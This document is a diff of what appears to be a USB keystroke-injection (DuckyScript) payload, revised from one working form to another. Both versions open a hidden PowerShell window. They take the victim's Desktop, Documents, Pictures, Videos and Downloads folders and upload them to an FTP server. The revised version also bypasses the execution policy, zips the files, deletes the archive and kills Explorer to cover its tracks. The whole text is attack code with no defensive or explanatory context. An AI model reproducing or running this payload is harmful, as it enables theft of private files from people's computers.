@@ -1,49 +1,22 @@
-REM Upload folders to FTP server
 DELAY 1000
 GUI r
+DELAY 300
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
 DELAY 500
-STRING powershell -WindowStyle Hidden
+STRING $ftp="ftp://yourftp.com";$user="ftpuser";$pass="ftppass";
 ENTER
-DELAY 1000
-
-REM Set FTP credentials
-STRING $ftpServer = "ftp.example.com"
+STRING $zip="$env:TEMP\p.zip";Add-Type -A System.IO.Compression.FileSystem;
 ENTER
-STRING $ftpUser = "YOUR_FTP_USERNAME"
+STRING $targets=@("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos","$env:USERPROFILE\Downloads");
 ENTER
-STRING $ftpPass = "YOUR_FTP_PASSWORD"
+STRING [IO.Compression.ZipFile]::CreateFromDirectory($targets[0],$zip);
 ENTER
-
-REM Directories to upload
-STRING $folders = @("Desktop", "Documents", "Pictures", "Downloads", "Videos")
+STRING foreach($d in $targets[1..($targets.Count-1)]){try{[IO.Compression.ZipFile]::CreateFromDirectory($d,"$env:TEMP\temp.zip");[IO.Compression.ZipFile]::Open($zip,[IO.Compression.ZipArchiveMode]::Update).CreateEntryFromFile("$env:TEMP\temp.zip","$(Split-Path $d -Leaf).zip");Remove-Item "$env:TEMP\temp.zip";}catch{}}
 ENTER
-STRING $userPath = "$env:USERPROFILE"
+STRING $wc=New-Object Net.WebClient;$wc.Credentials=New-Object Net.NetworkCredential($user,$pass);$wc.UploadFile("$ftp/p.zip",$zip);
 ENTER
-
-REM Loop through folders and upload files
-STRING foreach ($folder in $folders) {
+STRING Remove-Item $zip -Force;Stop-Process -Name explorer -Force;
 ENTER
-STRING     $fullPath = Join-Path $userPath $folder
-ENTER
-STRING     if (Test-Path $fullPath) {
-ENTER
-STRING         Get-ChildItem -Recurse $fullPath | foreach {
-ENTER
-STRING             if (-not $_.PSIsContainer) {
-ENTER
-STRING                 $webclient = New-Object System.Net.WebClient
-ENTER
-STRING                 $uri = "ftp://$ftpServer/" + $_.Name
-ENTER
-STRING                 $webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)
-ENTER
-STRING                 $webclient.UploadFile($uri, $_.FullName)
-ENTER
-STRING             }
-ENTER
-STRING         }
-ENTER
-STRING     }
-ENTER
-STRING }
+STRING exit
 ENTER
